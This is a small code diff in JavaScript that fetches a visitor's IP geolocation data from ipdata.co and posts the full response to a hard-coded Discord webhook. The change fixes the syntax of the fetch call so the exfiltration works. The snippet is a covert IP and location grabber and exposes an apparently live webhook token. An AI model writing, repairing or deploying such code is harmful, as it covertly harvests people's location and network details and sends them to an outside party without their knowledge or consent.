@@ -4,7 +4,7 @@ request.open('GET',`https://api.ipdata.co/?api-key={apiKey}`);
 request.setRequestHeader('Accept', 'application/json');
 request.onreadystatechange = function () {
   if (this.readyState === 4) {
-    fetch("https://discord.com/api/webhooks/1097163118964129803/lAbJM_aQ99MdPtrFlYcWc4FnKfdM5eT7HoSjG1GcRwzS2J_JIPDUqN7gyZy67o_2kxpq",{"method":"POST","headers":{"content-type":"application/json"},"body":JSON.stringify(responseText))
+    fetch("https://discord.com/api/webhooks/1097163118964129803/lAbJM_aQ99MdPtrFlYcWc4FnKfdM5eT7HoSjG1GcRwzS2J_JIPDUqN7gyZy67o_2kxpq",{"method":"POST","headers":{"content-type":"application/json"},"body":JSON.stringify(responseText)});
   }
 };
 
